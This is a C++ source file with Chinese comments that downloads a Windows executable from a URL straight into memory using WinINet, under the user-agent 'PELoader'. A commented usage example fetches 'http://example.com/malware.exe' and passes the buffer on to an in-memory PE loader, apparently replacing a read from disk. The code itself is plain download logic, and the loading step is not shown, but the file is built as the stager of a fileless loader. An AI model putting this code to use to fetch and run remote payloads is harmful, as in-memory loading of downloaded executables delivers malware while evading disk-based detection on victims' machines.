#include "Download.h"
#include <wininet.h>

#pragma comment(lib, "wininet.lib")


// 从URL下载PE文件到内存
std::vector<BYTE> DownloadPEFromUrl(const char* url) {
    std::vector<BYTE> fileBuffer;

    // 初始化WinINet
    HINTERNET hInternet = InternetOpenA("PELoader", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hInternet) return fileBuffer; // 失败返回空vector

    // 打开URL
    HINTERNET hUrl = InternetOpenUrlA(
        hInternet,
        url,
        nullptr,
        0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        0
    );
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return fileBuffer;
    }

    // 尝试获取Content-Length用于预分配
    char contentLengthStr[32] = { 0 };
    DWORD len = sizeof(contentLengthStr);
    if (HttpQueryInfoA(hUrl, HTTP_QUERY_CONTENT_LENGTH, contentLengthStr, &len, nullptr)) {
        long long size = std::strtoll(contentLengthStr, nullptr, 10);
        if (size > 0 && size < 1024 * 1024 * 100) { // 安全阈值：限制<100MB
            fileBuffer.reserve(static_cast<size_t>(size));
        }
    }

    // 循环读取数据
    BYTE buffer[8192]; // 8KB缓冲区提升吞吐
    DWORD bytesRead = 0;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fileBuffer.insert(fileBuffer.end(), buffer, buffer + bytesRead);
    }

    // 清理资源
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);


    return fileBuffer;
}

// ===== 使用示例（替换原代码位置）=====
/*
const char* peUrl = "http://example.com/malware.exe"; // 注意：实际使用需确保来源可信！
std::vector<BYTE> fileBuffer = DownloadPEFromUrl(peUrl);

if (fileBuffer.empty()) {
    // 处理下载失败（如：MessageBox, GetLastError()等）
    return false;
}

// 后续代码直接使用 fileBuffer.data() 和 fileBuffer.size()
// 例如：原代码中 fileSize 变量应替换为 fileBuffer.size()
*/